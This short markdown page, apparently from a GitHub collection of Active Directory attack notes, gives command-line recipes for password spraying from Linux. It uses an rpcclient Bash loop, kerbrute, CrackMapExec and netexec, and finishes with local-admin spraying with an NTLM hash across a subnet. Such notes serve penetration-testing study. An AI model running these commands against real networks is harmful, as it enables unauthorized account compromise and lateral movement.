# Internal Password Spraying - from Linux
Our creeated list name `valid_users.txt` if you don't have users list yet return back to [Pull User List](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/AD%20Enumeration/NULL%20Sessions.md#null-sessions-to-pull-user-list)
## Using a Bash one-liner for the Attack
We will assume the password we wanna to spray it `Welcome`
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome" -c "getusername;quit" <Target-IP> | grep Authority; done
```
## Using Kerbrute for the Attack
```shell
kerbrute passwordspray -d domain.local --dc <Target-IP> valid_users.txt  Welcome
```
## Using CrackMapExec/netexec & Filtering Logon Failures
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
sudo netexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
```
## Local Administrator Password Reuse
Local Admin Spraying with CrackMapExec
```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
